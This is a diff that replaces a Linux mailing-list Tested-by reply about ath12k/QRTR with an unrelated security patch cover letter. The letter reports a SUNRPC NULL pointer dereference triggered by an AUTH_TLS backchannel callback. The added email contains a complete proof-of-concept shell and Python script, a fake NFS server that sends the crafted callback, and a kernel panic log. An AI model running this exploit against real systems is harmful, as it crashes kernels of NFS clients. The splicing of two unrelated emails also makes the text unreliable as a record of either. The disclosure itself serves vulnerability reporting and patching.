@@ -1,100 +1,102 @@
-Authentication-Results: smtp.subspace.kernel.org; arc=pass header.oldest-pass=0 smtp.remote-ip=195.140.195.201
-ARC-Seal: i=2; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=pass;
-	t=1792734716;
-	b=oS61gEEm/wLhM1dESab+9kVk02TquoNCmA/xCO6hMW2KESwQmj1F2DTFC/0Of6eUKeB4
-	 y04oTUUl6gTa9ySQ23SFbokv+/oCyuhFLcurFGqXruaABHzXngsW5UlfdfnwaEoSpa5tl
-	 fRv6gMD6F0ctEXyfdJ1cxClmOSsrINyv5dAy8N2gsZOOxJmomGEf403Y/jKgKSqTlNgu9
-	 pwNxWIjS6ha0E+iyirf0ZqLu9ZrHVioulZvJdCSEwSg37fvNHpt1eefs6oQk0Ha4lelDB
-	 D5dhRJibp49oJtrwnVreA3xRqJEe+dFDsnPV+wOYbuKfQTKov0xfzQHsb81F0Nh/8qg==
-ARC-Message-Signature: i=2; d=subspace.kernel.org; s=arc20261015;
-	a=rsa-sha256; c=relaxed/relaxed; t=1792734716;
-	h=DMARC-Filter:Received:DKIM-Signature:Received:Received:X-ME-Sender:
-	 X-ME-Proxy-Cause:X-ME-Proxy:Feedback-ID:Received:X-Mailer:
-	 MIME-Version:X-ThreadId:Date:From:To:Cc:Message-Id:In-Reply-To:
-	 References:Subject:Content-Type:Content-Transfer-Encoding;
-	bh=3s1r5gmalSPoDYnFT/d9Qqqf/FI59P/VjbJqXlAkQZY=;
-	b=lfEF3xs9g1WvOmdN2OsScBI3Y4zUFk7vQm7vCyzupDJ6Es3wfS/JrXiS4fIhcU3KBrpi
-	 L81+yFmKe7Fn6Il/FNeMKkJ79f1cBOVdxcykHQNibT/RNWvLLbBveh4nk3MSoo299IfeY
-	 eU26PadzpYxxbLj0xSyt95X4PxA63H0uOZUkSx4YSZkW3q002nMCv0Nph+COIcR63VBXb
-	 Jv9c89wn8wJ5wvgZymLLcMAia8CcASejaAH/LUUnZ+d/kCBRFNE8hsIKI/sUedasv2+hK
-	 KDFwhl64KLP7q6oVFNP6DeGFbdV+8miIVpkROnRraXjznGZ94/9ImHGfFM7lZmrMazg==
-ARC-Authentication-Results: i=2; smtp.subspace.kernel.org; 
-	dmarc=none header.from=iki.fi;
-	spf=pass smtp.mailfrom=iki.fi;
-	dkim=pass header.d=iki.fi header.i=@iki.fi header.a=rsa-sha256 header.s=meesny header.b=XjQt+Noj;
-	arc=pass header.oldest-pass=0 smtp.remote-ip=195.140.195.201
-Received: from meesny.iki.fi (meesny.iki.fi [195.140.195.201])
-	(using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=74.125.82.181
+ARC-Seal: i=1; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=none;
+	t=1792734952;
+	b=N4A0sDzuNILRTV4mIaqNALonOAI8hNE2UJrJtbRLjX2dQNiT5dbgiRvpnDGxRVvcxDG9
+	 Z9HkOT0E3SKdtniYhijJYDom453PooJ4sNewwpP5oLXU0n+Thnn30+aQEV0tisDj26+Mp
+	 hArB5P1SvfEDg0Ejs4S8y7rnqrsriUjvj3qu1zD1taWjGipwx50ScyjKXMV207xZxfbW6
+	 1HXdNcOWduJUwXUEg7t52iceLOsuplXJ0PL0d778HorgIz5vRT8DnGxJDDbIgWLIhdYE+
+	 uuEDfwmF8ssl226zVLHO0ZMSmHlETtvJ0vLvN5RyPf5P4afoRLo1V9IvwFVbFsVBg5g==
+ARC-Message-Signature: i=1; d=subspace.kernel.org; s=arc20261015;
+	a=rsa-sha256; c=relaxed/relaxed; t=1792734952;
+	h=DMARC-Filter:Received:DKIM-Signature:X-Google-DKIM-Signature:
+	 X-Forwarded-Encrypted:X-Gm-Message-State:X-Gm-Gg:X-Received:Received:
+	 From:To:Cc:Subject:Date:Message-ID:X-Mailer:MIME-Version:
+	 Content-Transfer-Encoding;
+	bh=ohadrD8hMTMMoQydk1sLe5jD5drtM5LiLvY1pZe3Sxk=;
+	b=lr+PSZykeiTBps1ooR1svWFOitCI+kIXExZg7E4ntFgALSx2Dnf+jogOYU/WZm83Id0A
+	 RzFWT4cpdwTjlo/pRp/j9U4o8obbdOm6vm5NvSs8jK6mEW1j/D/n6XYeUuI5Q/6EfvzXt
+	 EXV6rnilV84afngD7iDpX25k5H3SzHA0zJrswViWBozn43DQKDAVNEwGXO5XqEmO6qNWM
+	 7gWvuL46SFEkCbaQnGMR2CPALel9TGfRYSImXX9ZLpigKBWIGsSjEWZa46iUORNohjbpZ
+	 3uC0t7dxW7tuJCafMUFWaOP55VCG0Y36tso3CmutraBFbkOosIbACx3LtgJHEKe0j8g==
+ARC-Authentication-Results: i=1; smtp.subspace.kernel.org; 
+	dmarc=pass header.from=nebusec.ai;
+	spf=pass smtp.mailfrom=nebusec.ai;
+	dkim=pass header.d=nebusec.ai header.i=@nebusec.ai header.a=rsa-sha256 header.s=google header.b=C7qVXCP1;
+	arc=none smtp.remote-ip=74.125.82.181
+Received: from mail-dy1-f181.google.com (mail-dy1-f181.google.com [74.125.82.181])
+	(using TLSv1.3 with cipher TLS_AES_128_GCM_SHA256 (128/128 bits)
 	 key-exchange X25519 server-signature ECDSA (prime256v1) server-digest SHA256)
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 8546D606A31B
-	for <netdev@vger.kernel.org>; Fri, 23 Oct 2026 05:51:55 +0000 (UTC)
-DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org 8546D606A31B
-Authentication-Results: smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=iki.fi
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=iki.fi
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id EE7F9606A31D
+	for <netdev@vger.kernel.org>; Fri, 23 Oct 2026 05:55:50 +0000 (UTC)
+DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org EE7F9606A31D
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (1024-bit key, unprotected) header.d=iki.fi header.i=@iki.fi header.a=rsa-sha256 header.s=meesny header.b=XjQt+Noj
-Received: from fauth-c2-smtp.messagingengine.com (fauth-c2-smtp.messagingengine.com [204.75.18.201])
-	(using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
-	 key-exchange x25519 server-signature RSA-PSS (2048 bits) server-digest SHA256)
-	(No client certificate requested)
-	(Authenticated sender: jmtilli)
-	by meesny.iki.fi (Postfix) with ESMTPSA id 4j9sbL4CGmzyQv;
-	Fri, 23 Oct 2026 08:51:41 +0300 (EEST)
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=iki.fi; s=meesny;
-	t=1792734703;
-	h=from:from:reply-to:subject:subject:date:date:message-id:message-id:
-	 to:to:cc:cc:mime-version:mime-version:content-type:content-type:
-	 content-transfer-encoding:content-transfer-encoding:
-	 in-reply-to:in-reply-to:references:references;
-	bh=3s1r5gmalSPoDYnFT/d9Qqqf/FI59P/VjbJqXlAkQZY=;
-	b=XjQt+NojvA5vLZXlM6CafqE3OQNtzXVMQB9+lTfI4hXFu+ukmCz8JYXa9d9LWMCeQrH1sx
-	PrExNO+u6vJP7AgFzKzZnwrS6fDaKgt5qh4xiqEwU3Yb17JMZRTAoNMTyuFo7Zje/WVrDP
-	Mz9sidL6wtHyMjtD4nuplXCpZwh47po=
-ARC-Seal: i=1; a=rsa-sha256; d=iki.fi; s=meesny; cv=none; t=1792734703;
-	b=xejW6Jrc8H+viRQd+M0WhQa4h9yvQQvT3BVNagdU6/v+uyUe07JyY6im34Sio0omdShKVf
-	ebpAXso+5dSdxI9vpZKSvYN//rFIh3hwUwgANJIoQU9R/SRM5ZaJzvFxTfLNzBst62Rhja
-	d2SKMd1R+/v02MR26LUuMH0XcxTXyrw=
-ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=iki.fi;
-	s=meesny; t=1792734703;
-	h=from:from:reply-to:subject:subject:date:date:message-id:message-id:
-	 to:to:cc:cc:mime-version:mime-version:content-type:content-type:
-	 content-transfer-encoding:content-transfer-encoding:
-	 in-reply-to:in-reply-to:references:references;
-	bh=3s1r5gmalSPoDYnFT/d9Qqqf/FI59P/VjbJqXlAkQZY=;
-	b=xBtgWaLkNBolpOnDpkKErDPXxxkitooOZsXQV0hb8sjFGpx9dPDK1doK4/xuskmCGr3TZy
-	YL+KVmGreZOQrXtNkG0v9KWLkSHFfmuBwqXWzx81dpGVdyFgRHnr3PTJyNMcoqnFLsW3jr
-	dhpw/6m+8uwBcUxusZoK6pfxB3T8g0k=
-ARC-Authentication-Results: i=1;
-	ORIGINATING;
-	auth=pass smtp.auth=jmtilli smtp.mailfrom=juha-matti.tilli@iki.fi
-Received: from ams-compute-02.internal (ams-compute-02.internal [10.64.2.62])
-	by mailfauth.ams.internal (Postfix) with ESMTP id 4D9A3198003A;
-	Fri, 23 Oct 2026 01:51:41 -0400 (EDT)
-Received: from ams-imap-13 ([10.64.2.33])
-  by ams-compute-02.internal (MEProxy); Fri, 23 Oct 2026 01:51:41 -0400
-X-ME-Sender: <xms:6vXaatT642KtAE2v1k4apwVm6NamCAP4qZad1MYMpBXOgct0ZHo5Vg>
-    <xme:6vXaahkYa91a9gZcxJzj0c09mbJXjmINtL1EH_bTPfQaGg9gMal3MK-v-68Qj0pUw
-    baOwpYwMlYTZa8-Fh_4aADHt2DMeZj3uNGakkgFats1Ksi7r2uEXY8>
-X-ME-Proxy-Cause: dmFkZTEOAffXHrZ7qf6laLm8K4UbsibtaQ04Y9gn38XjIQYNxcrz1Fl3RLa0WvHT9IgL8f
-    qdObnItt5VvnEY2RWOrGh2jX7lkuRrUqslrHFZNziA/waicBmBs/Hme0bulf+865fOwb4x
-    9CBWLB9pEUueADEEuhQQZTCHZicvzh3QEYQgIojFmPRXbVpZMGPsP4hhdQnHnlwt/76gDq
-    lvDkC0cycMGeRFvRBsLnLVifDAA8lkV/36iQIhdMaruHdM9MOUhvmBRwTxzagXmIj/mM/6
-    p1sJB5qeUyCAnOAMvgYUgDQ7SViaOwtcMT39FBBgpxFr+Yvt3D5L6ockEezFFSFacCrBpk
-    XIUDA7KyF22WlBmtpMfGZuNvzQ9w2WDJ1yRMgPpZmSHX+nQehY/UFMPx6cFDInfp9lSCWQ
-    P26ZJdomAdRpVmSbDeIRINWnkYv6rZd0XYhMXqyT88pBHdZ0QnNNGSWfmEw5RXs21rJKbX
-    NwazhetR1+6GCprg3W92qRBFlDiH1whcMpes+9BVaHjKlDtOGNtYIkBR44ph2RpYwXQz98
-    vgfb9Sfz9ryDMcQsFcI/B8QUBwNLUVlCV6qXjAnEQN9M2vDFB/SAg1fagSxFb0pax8qC3c
-    vb7YSMlJBRf3KiCx+HaZmbJwGBXVgnB/4ea4mwZsuxtysA0oFqL9uwi0wiWw
-X-ME-Proxy: <xmx:7fXaasitCF0o1BqCXGpL7TphJjMJCnTKfuiOnHrxsaNaNq07zaplJA>
-    <xmx:7fXaavhV77e16KeAxXc87D6Fm9oQJnEHNXwxxnfC-I-6HCcqE79RsQ>
-    <xmx:7fXaahAI6u7cOzt30SlP5c-SlmBPzWtmu_hy-kBRPJeHhwQQ-tBlkA>
-    <xmx:7fXaav-VEGeVbB1DbicfFvfSP2Euz0qAGE3w76yBkC-YvzVdVAbfKw>
-    <xmx:7fXaaiA7pQZq931gK3K1yPjWGG-xF8S3qW0dlfRje9krjTn8YfVTsqiX>
-Feedback-ID: i02414972:Fastmail
-Received: by mailuser.ams.internal (Postfix, from userid 501)
-	id 9A464F80098; Fri, 23 Oct 2026 01:51:38 -0400 (EDT)
-X-Mailer: MessagingEngine.com Webmail Interface
+	dkim=pass (2048-bit key, unprotected) header.d=nebusec.ai header.i=@nebusec.ai header.a=rsa-sha256 header.s=google header.b=C7qVXCP1
+Received: by mail-dy1-f181.google.com with SMTP id 5a478bee46e88-353804b591eso962086eec.0
+        for <netdev@vger.kernel.org>; Thu, 22 Oct 2026 22:55:50 -0700 (PDT)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=nebusec.ai; s=google; t=1792734950; x=1793339750; darn=vger.kernel.org;
+        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
+         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
+        bh=ohadrD8hMTMMoQydk1sLe5jD5drtM5LiLvY1pZe3Sxk=;
+        b=C7qVXCP1u4QZpro6Qe2CDOdHmPzgwiXex/gDqpdirnVQsv24p7bwSUjvsQt+D4WK2D
+         IZsh+Ss8wIIyI32R9B+asyWBJrmqQ2koASL1shG9mtkEJb576/hWZpUd4jNoO0FBYHN3
+         O/Zg8dDBSmolR+/YPXFnOZUe79d9EXYIyC6ni6CaVjQKJ0F8KXLREX1gAKfZ/hTF2P50
+         u05K6mlADRVPcUIbEnOnLyUK8Ujn1WXmuqq8fRbkIuauG8S8egcQGAYI+tz++XwX5Pwz
+         rIXTGJQQyanR7kNMYSicAsRspQgJWhhlKoayWfTkKL22fFVpuLUhVYMbsHyoSWctsB1T
+         zCwg==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20260707; t=1792734950; x=1793339750;
+        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
+         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
+         :message-id:reply-to:content-type;
+        bh=ohadrD8hMTMMoQydk1sLe5jD5drtM5LiLvY1pZe3Sxk=;
+        b=d4hamGMmVZAGU65aqhzDgJEmJ5S9xnpHVoHupXZ26A3UY1OtX9iEu3BvxJsgoFhYz/
+         3b9YsQzSB46mNhuvEQ07cvhVInlbsQr/biXXgQmDDHXOEYvsgU5mQB4LFEjsHklIpMyo
+         gX1fZxZ/J01mnQ7zymJgKyUX5JJ3mOYokxNj9L3dxBFOKTPsbvZs6xqOrTfD/A2C9c1q
+         tx1WjpNYCUWw7UbfmcPALAzBxXDQbejh1NI7n42notKWmcTduMnF0SLmqLm6EGQ+DIL5
+         5CxxdV+xQJ1zUle9hwBK0Xvh8JfPwsP9bzwNQyVAAENLnGY/boUUPXSzuOZUfDk+V75X
+         cF1Q==
+X-Forwarded-Encrypted: i=1; AKwUvBziZ4my8OaSQKJ3f4DD2B5ctJG3/g95r40XjxnHdZ4PgVARNVLOCFHZOY7eEhOVnAcqdIrsPwc=@vger.kernel.org
+X-Gm-Message-State: AFq9FYKWc5NK8aIYLzOtTnh+HJ91EwjEeoE31YU2zENMqxSPNQ1zJO2I
+	evdXaiXV1mZJugy0i+lAR/XKl24iDh6hDzRjlXflFbmoTXFpS9E07myM/7GZzns5whHt
+X-Gm-Gg: AYBFou0mv2RY9JRosdT0+kJHlYAi1BnWTp1uhxBEfseZnE1qh5RmxtXKHwLHrnPGimd
+	fUok11IcLB9tW6r19gvw0CmgE1GJ3cRxfxzXyrxDPpukceJkZnq1hJb+ks8s9/6amgFMdIoVwK7
+	zEHW/EWKC5KyuMjAaZ6/oM43hezZqkD3ixxttohxGa9dYdX99VhHTIqEOtFS89rJh8f/sqdG3mJ
+	OWkBOCqKPdJThnmM/jDt7dVVgOJCasukI5edAmEX0TXTG9VTtWKMZQopGdObwHPDXYXssve3iNe
+	5+QtogyIVGTkn584CwAZoI+rXMQCWGuDdXN0XzlpWhlzFeBP3g131tNTHqiwa2PQfyl2iYJHDIF
+	V2mmT3CCWRlOL1j1/K4WUIq8cw1XJWcz0ZgiENTcqM3omb57sb2rs3BOE4q/vAQa05pFY2qNrmM
+	tAC+0vJwOAw7ifLxaXHWDUtFiY5RRgj3+quYOf11i0O9Nsk+Lvg8fpeL/F5FTL6TwaqPFu7YaAw
+	H5ZUoMQ7tpCO60UnQExceeN0W04sodKZdvUdBupz7zXE1X4nFSJaGyEAiE8HPAe1HC48So=
+X-Received: by 2002:a05:693c:8945:20b0:369:44b3:99c0 with SMTP id 5a478bee46e88-369d96cedf9mr1633822eec.8.1792734949760;
+        Thu, 22 Oct 2026 22:55:49 -0700 (PDT)
+Received: from Roxy.sysu.edu.cn ([203.175.14.54])
+        by smtp.gmail.com with ESMTPSA id 5a478bee46e88-369d9def334sm3656543eec.24.2026.10.22.22.55.46
+        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
+        Thu, 22 Oct 2026 22:55:49 -0700 (PDT)
+From: Zhiling Zou <zhilinz@nebusec.ai>
+To: linux-nfs@vger.kernel.org,
+	netdev@vger.kernel.org
+Cc: trondmy@kernel.org,
+	anna@kernel.org,
+	cel@kernel.org,
+	jlayton@kernel.org,
+	neil@brown.name,
+	okorniev@redhat.com,
+	Dai.Ngo@oracle.com,
+	tom@talpey.com,
+	davem@davemloft.net,
+	edumazet@kernel.org,
+	pabeni@redhat.com,
+	horms@kernel.org,
+	vega@nebusec.ai,
+	zhilinz@nebusec.ai
+Subject: [PATCH net 0/1] SUNRPC: reject AUTH_TLS on backchannel requests
+Date: Fri, 23 Oct 2026 13:55:34 +0800
+Message-ID: <cover.1792734713.git.zhilinz@nebusec.ai>
+X-Mailer: git-send-email 2.55.0
 X-Mailing-List: netdev@vger.kernel.org
 List-Id: <netdev.vger.kernel.org>
 List-Post: <mailto:netdev@vger.kernel.org>
@@ -104,60 +106,211 @@ List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
 List-Owner: <mailto:netdev+owner@vger.kernel.org>
 Precedence: list
 MIME-Version: 1.0
-X-ThreadId: AlBSNYy1g8DB
-Date: Fri, 23 Oct 2026 08:51:17 +0300
-From: "Juha-Matti Tilli" <juha-matti.tilli@iki.fi>
-To: "Manivannan Sadhasivam" <manivannan.sadhasivam@oss.qualcomm.com>,
- "Manivannan Sadhasivam" <mani@kernel.org>,
- "David S . Miller" <davem@davemloft.net>,
- "Eric Dumazet" <edumazet@google.com>, "Jakub Kicinski" <kuba@kernel.org>,
- "Paolo Abeni" <pabeni@redhat.com>, "Simon Horman" <horms@kernel.org>,
- "Jeff Johnson" <jjohnson@kernel.org>
-Cc: linux-arm-msm@vger.kernel.org, netdev@vger.kernel.org,
- linux-kernel@vger.kernel.org, linux-wireless@vger.kernel.org,
- ath11k@lists.infradead.org, ath12k@lists.infradead.org,
- "Bjorn Andersson" <andersson@kernel.org>,
- "Chris Lew" <christopher.lew@oss.qualcomm.com>,
- "Deepak Kumar Singh" <deepak.singh@oss.qualcomm.com>,
- "Raj Kumar Bhagat" <raj.bhagat@oss.qualcomm.com>,
- "Jeff Hugo" <jeff.hugo@oss.qualcomm.com>
-Message-Id: <b9dc8c23-9c4e-448a-a159-434ccde72c78@app.fastmail.com>
-In-Reply-To: <20261022-qrtr-multi-ep-v4-4-c6fdb75fcd3e@oss.qualcomm.com>
-References: <20261022-qrtr-multi-ep-v4-0-c6fdb75fcd3e@oss.qualcomm.com>
- <20261022-qrtr-multi-ep-v4-4-c6fdb75fcd3e@oss.qualcomm.com>
-Subject: Re: [PATCH v4 4/4] wifi: ath12k: Connect to the QMI server belonging to the
- device owned by this driver
-Content-Type: text/plain
-Content-Transfer-Encoding: 7bit
+Content-Transfer-Encoding: 8bit
 
-On Thu, Oct 22, 2026, at 20:43, Manivannan Sadhasivam via B4 Relay wrote:
-> From: Manivannan Sadhasivam <manivannan.sadhasivam@oss.qualcomm.com>
-> 
-> When two identical ath12k PCIe devices are connected to the same host, both
-> advertise the WLFW service with the same service and instance id. The QMI
-> lookup reports both servers to each device, so a device may connect to the
-> firmware running on the other device.
-> 
-> But now, QRTR provides each MHI endpoint a unique node id which is
-> different from the node id announced by the device. So use the same id to
-> pick the correct server. Add a get_qrtr_node_id() HIF callback that returns
-> the node id derived from the MHI controller index and zero for transports
-> that do not assign one. In the new_server callback, reject any service
-> whose node id does not match. A node id of zero disables the check, so
-> transports that do not assign one keep their current behavior.
+Hi Linux kernel maintainers,
 
-Tested-by: Juha-Matti Tilli <juha-matti.tilli@iki.fi>
-Tested-on: 2x WCN7850 hw2.0 WLAN.IOE_HMT.1.1-00018-QCAHMTSWPL_V1.0_V2.0_SILICONZ-1
+We found and validated a NULL pointer dereference in
+net/sunrpc/svcauth_unix.c. A malicious NFSv4.1 server can trigger it in
+a client by sending an AUTH_TLS callback request over the backchannel.
+The reproducer uses a privileged local mount to a fake server.
 
-As always, I took the entire state of the QRTR directory as of after
-these changes, on top of 6.18.53 kernel, and with some trivial changes
-like kzalloc_obj made it compile. Then I cherry-picked the ath11k/ath12k
-changes, which had no conflicts now.
+We will provide details of the bug below, along with the PoC and the
+QEMU crash log.
 
-I have two ath12k access points on this router, both work 
-simultaneously.
+---- details below ----
 
-If somebody wants to test this backported variant, it's here:
-https://github.com/jmtilli/linux/tree/6_18_multi_ath11k_ath12k_mani_v4
+Bug details:
 
-BR, Juha-Matti
+svc_process_bc() processes reverse-direction RPC calls with
+rqstp->rq_xprt set to NULL, then hands the request to
+svc_process_common() for authentication. For an RPC_AUTH_TLS credential,
+svc_authenticate() calls svcauth_tls_accept(). A valid empty credential
+and NULL verifier on procedure zero pass the initial checks. The TLS
+authenticator then dereferences rqstp->rq_xprt to inspect transport
+handshake support, causing a NULL pointer dereference before the NFS
+callback program can reject the request.
+
+Reject AUTH_TLS when the request has no service transport. Such a
+backchannel request is denied before the authenticator accesses
+rq_xprt.
+
+Reproducer:
+
+    chmod +x poc.sh
+    ./poc.sh
+
+Run the reproducer as root in a QEMU guest with NFSv4.1, SUNRPC
+backchannel support, and KASAN enabled. The script starts a local fake
+NFS server, mounts it with NFSv4.1, and sends the malformed callback.
+
+The crash was reproduced on Linux 6.12.95 with CONFIG_NFS_FS,
+CONFIG_NFS_V4_1, CONFIG_NFSD, CONFIG_SUNRPC,
+CONFIG_SUNRPC_BACKCHANNEL, and CONFIG_KASAN enabled.
+
+------BEGIN poc.sh------
+
+#!/bin/sh
+set -eu
+
+MNT=/tmp/nfs-bc-poc
+PORT=3049
+SERVER=/tmp/nfs-bc-server.py
+
+mkdir -p "$MNT"
+
+cat >"$SERVER" <<'PY'
+import socket
+import struct
+import time
+
+
+def recvn(conn, count):
+    data = b""
+    while len(data) < count:
+        chunk = conn.recv(count - len(data))
+        if not chunk:
+            raise EOFError(f"short read: wanted {count}, got {len(data)}")
+        data += chunk
+    return data
+
+
+def recv_record(conn):
+    marker = recvn(conn, 4)
+    value, = struct.unpack(">I", marker)
+    length = value & 0x7fffffff
+    return marker + recvn(conn, length)
+
+
+def send_record(conn, payload):
+    conn.sendall(struct.pack(">I", 0x80000000 | len(payload)) + payload)
+
+
+def null_reply(xid):
+    # xid, REPLY, MSG_ACCEPTED, AUTH_NULL, len=0, SUCCESS
+    return struct.pack(">6I", xid, 1, 0, 0, 0, 0)
+
+
+malicious_call = struct.pack(
+    ">10I",
+    0xdeadbeef,  # xid
+    0,           # CALL
+    2,           # RPC version
+    0x40000000,  # NFS4_CALLBACK
+    4,           # callback program version
+    0,           # CB_NULL
+    7,           # RPC_AUTH_TLS
+    0,           # empty credential body
+    0,           # RPC_AUTH_NULL verifier
+    0,           # empty verifier body
+)
+
+
+listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+listener.bind(("127.0.0.1", 3049))
+listener.listen(1)
+
+conn, addr = listener.accept()
+print(f"accepted {addr}", flush=True)
+
+req1 = recv_record(conn)
+print(f"req1={req1.hex()}", flush=True)
+xid1, = struct.unpack(">I", req1[4:8])
+send_record(conn, null_reply(xid1))
+print("sent null reply", flush=True)
+
+req2 = recv_record(conn)
+print(f"req2={req2.hex()}", flush=True)
+send_record(conn, malicious_call)
+print("sent malicious callback", flush=True)
+
+time.sleep(30)
+PY
+
+python3 "$SERVER" >/tmp/nfs-bc-server.log 2>&1 &
+server_pid=$!
+trap 'kill "$server_pid" 2>/dev/null || true' EXIT INT TERM
+sleep 1
+
+# -i bypasses mount.nfs helper pre-probes so the kernel client speaks to our
+# local fake server directly.
+mount -i -t nfs4 \
+  -o vers=4.1,port="$PORT",addr=127.0.0.1,clientaddr=127.0.0.1,soft,timeo=1,retrans=0 \
+  127.0.0.1:/ "$MNT" || true
+
+sleep 5
+cat /tmp/nfs-bc-server.log || true
+
+------END poc.sh--------
+
+----BEGIN crash log----
+
+[  237.564994][ T1083] Oops: general protection fault, probably for non-canonical address 0xdffffc0000000001: 0000 [#1] SMP KASAN NOPTI
+[  237.565967][ T1083] KASAN: null-ptr-deref in range [0x0000000000000008-0x000000000000000f]
+[  237.566585][ T1083] CPU: 1 UID: 0 PID: 1083 Comm: NFSv4 callback Not tainted 6.12.95 #1 7b931b951f26d30ef9f3f8d44b931a24dbfb5ce6
+[  237.567454][ T1083] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
+[  237.568324][ T1083] RIP: 0010:svcauth_tls_accept+0x230/0x800
+[  237.568824][ T1083] Code: 85 59 05 00 00 48 89 83 68 01 00 00 48 85 c0 0f 84 cb 03 00 00 48 b8 00 00 00 00 00 fc ff df 49 8d 7d 08 48 89 fa 48 c1 ea 03 <80> 3c 02 00 0f 85 46 05 00 00 48 b8 00 00 00 00 00 fc ff df 4d 8b
+[  237.570143][ T1083] RSP: 0018:ffffc90003107c48 EFLAGS: 00010212
+[  237.570539][ T1083] RAX: dffffc0000000000 RBX: ffff888109430000 RCX: 1ffff1102128602d
+[  237.571037][ T1083] RDX: 0000000000000001 RSI: 0000000000000004 RDI: 0000000000000008
+[  237.571535][ T1083] RBP: 1ffff92000620f8a R08: 0000000000000001 R09: ffffed102080a865
+[  237.572030][ T1083] R10: ffff88810405432b R11: 0000000000000001 R12: ffff8881094301f0
+[  237.572535][ T1083] R13: 0000000000000000 R14: ffff888109432c84 R15: ffffffff88b0b240
+[  237.573030][ T1083] FS:  0000000000000000(0000) GS:ffff888119e00000(0000) knlGS:0000000000000000
+[  237.573591][ T1083] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+[  237.574006][ T1083] CR2: 000079a069f1b0a0 CR3: 0000000117296001 CR4: 0000000000770ef0
+[  237.574512][ T1083] PKRU: 55555554
+[  237.574738][ T1083] Call Trace:
+[  237.574950][ T1083]  <TASK>
+[  237.575141][ T1083]  ? __pfx_svcauth_tls_accept+0x10/0x10
+[  237.575496][ T1083]  ? lock_acquire+0x153/0x2f0
+[  237.575818][ T1083]  svc_process_common+0x84b/0x1ce0
+[  237.576148][ T1083]  ? lock_release+0x687/0xc90
+[  237.576493][ T1083]  ? __pfx_svc_process_common+0x10/0x10
+[  237.576914][ T1083]  ? __pfx_lock_release+0x10/0x10
+[  237.577298][ T1083]  svc_process_bc+0x4ed/0x980
+[  237.577655][ T1083]  ? srso_alias_return_thunk+0x5/0xfbef5
+[  237.578110][ T1083]  ? do_raw_spin_unlock+0x14a/0x1f0
+[  237.578498][ T1083]  ? __pfx_svc_process_bc+0x10/0x10
+[  237.578937][ T1083]  nfs4_callback_svc+0xb1/0x140
+[  237.579271][ T1083]  ? __pfx_nfs4_callback_svc+0x10/0x10
+[  237.579683][ T1083]  kthread+0x2bd/0x3a0
+[  237.580000][ T1083]  ? __pfx_kthread+0x10/0x10
+[  237.580336][ T1083]  ? __pfx_kthread+0x10/0x10
+[  237.580693][ T1083]  ret_from_fork+0x31/0x70
+[  237.581036][ T1083]  ? __pfx_kthread+0x10/0x10
+[  237.581393][ T1083]  ret_from_fork_asm+0x1a/0x30
+[  237.581771][ T1083]  </TASK>
+[  237.581995][ T1083] Modules linked in:
+[  237.582447][ T1083] ---[ end trace 0000000000000000 ]---
+[  237.582861][ T1083] RIP: 0010:svcauth_tls_accept+0x230/0x800
+[  237.583310][ T1083] Code: 85 59 05 00 00 48 89 83 68 01 00 00 48 85 c0 0f 84 cb 03 00 00 48 b8 00 00 00 00 00 fc ff df 49 8d 7d 08 48 89 fa 48 c1 ea 03 <80> 3c 02 00 0f 85 46 05 00 00 48 b8 00 00 00 00 00 fc ff df 4d 8b
+[  237.585029][ T1083] RSP: 0018:ffffc90003107c48 EFLAGS: 00010212
+[  237.585481][ T1083] RAX: dffffc0000000000 RBX: ffff888109430000 RCX: 1ffff1102128602d
+[  237.586066][ T1083] RDX: 0000000000000001 RSI: 0000000000000004 RDI: 0000000000000008
+[  237.586644][ T1083] RBP: 1ffff92000620f8a R08: 0000000000000001 R09: ffffed102080a865
+[  237.587235][ T1083] R10: ffff88810405432b R11: 0000000000000001 R12: ffff8881094301f0
+[  237.588020][ T1083] R13: 0000000000000000 R14: ffff888109432c84 R15: ffffffff88b0b240
+[  237.588798][ T1083] FS:  0000000000000000(0000) GS:ffff888119e00000(0000) knlGS:0000000000000000
+[  237.589472][ T1083] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+[  237.590105][ T1083] CR2: 000079a069f1b0a0 CR3: 0000000117296001 CR4: 0000000000770ef0
+[  237.590876][ T1083] PKRU: 55555554
+[  237.591159][ T1083] Kernel panic - not syncing: Fatal exception
+[  237.591781][ T1083] Kernel Offset: disabled
+[  237.592105][ T1083] Rebooting in 10 seconds..
+
+-----END crash log-----
+
+Best regards,
+Zhiling Zou
+
+Zhiling Zou (1):
+  SUNRPC: reject AUTH_TLS on backchannel requests
+
+ net/sunrpc/svcauth_unix.c | 5 +++++
+ 1 file changed, 5 insertions(+)
+
+-- 
+2.55.0
